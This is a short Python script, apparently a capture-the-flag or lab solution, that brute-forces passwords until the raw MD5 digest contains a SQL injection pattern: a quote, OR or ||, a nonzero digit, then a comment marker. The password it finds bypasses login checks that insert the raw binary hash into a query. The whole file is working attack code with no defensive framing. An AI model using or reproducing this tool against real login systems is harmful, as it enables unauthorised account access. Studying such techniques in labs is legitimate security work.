from hashlib import md5

"""
First, look for "'"
Second, traverse through spaces until coming across "OR ", "oR ", "Or ", or "||"
Third, traverse through spaces until coming across "1", "2", "3", "4", "5", "6", "7", "8", or "9"
Fourth, traverse through spaces until coming across "#" or "-- "
"""

# Second, traverse through spaces until coming across "OR ", "oR ", "Or ", or "||"
def or_search(tester,pos):
	while pos <= 15:
		if tester[pos] == " ":
			pos+=1
		elif tester[pos] == "O" or tester[pos] == "o":
			pos+=1
			if pos <= 15 and (tester[pos] == "R" or tester[pos] == "r"):
				pos+=1
				if pos <= 15 and tester[pos] == " ":
					return num_search(tester,pos+1)
		elif tester[pos] == "|":
			pos+=1 
			if pos <= 15 and tester[pos] == "|":
				return num_search(tester,pos+1)
		else:
			break
	return 0

# Third, traverse through spaces until coming across "1", "2", "3", "4", "5", "6", "7", "8", or "9"
def num_search(tester,pos):
	while pos <= 15:
		if tester[pos] == " ":
			pos+=1
		elif 49 <= ord(tester[pos]) <= 57:
			return comment_search(tester,pos+1)
		else:
			break
	return 0

# Fourth, traverse through spaces until coming across "#" or "-- "
def comment_search(tester,pos):
	while pos <= 15:
		if tester[pos] == " ":
			pos+=1
		elif tester[pos] == "#":
			return 1
		elif tester[pos] == "-":
			pos+=1
			if pos <= 15 and tester[pos] == "-":
				pos+=1
				if pos <= 15 and tester[pos] == " ":
					return 1
		else:
			break
	return 0


# flag to indicate when the correct password has been found
found = 0

# test_pass holds the inputted password
test_pass = "!"
curr_char = "!"
pass_length = len(test_pass)

while found == 0:
	# apply the curr_char to the string
	test_pass = curr_char + test_pass[1:pass_length]

	# check to see if the new hash is what we want. If it is, print out the input that created the hash
	tester = md5(test_pass).digest()
	#print(test_pass)
	pos = tester.find("'")
	if 0 <= pos <= 11:
		found = or_search(tester,pos+1)
	
	if found == 1:
		break

	# increment the curr_char. If it reaches the end, add a new character to the string
	curr_char = chr(ord(curr_char)+1)
	if curr_char == "\x7f":
		spot = 0
		while (spot <= pass_length):
			if spot == pass_length:
				test_pass += "!"
				break
			elif test_pass[spot] == "~":
				test_pass = test_pass[0:spot] + "!" + test_pass[spot+1:pass_length]
				spot+=1
			else:
				test_pass = test_pass[0:spot] + chr(ord(test_pass[spot])+1) + test_pass[spot+1:pass_length]
				break
		curr_char = "!"
		pass_length = len(test_pass)

print(test_pass)
print(tester)
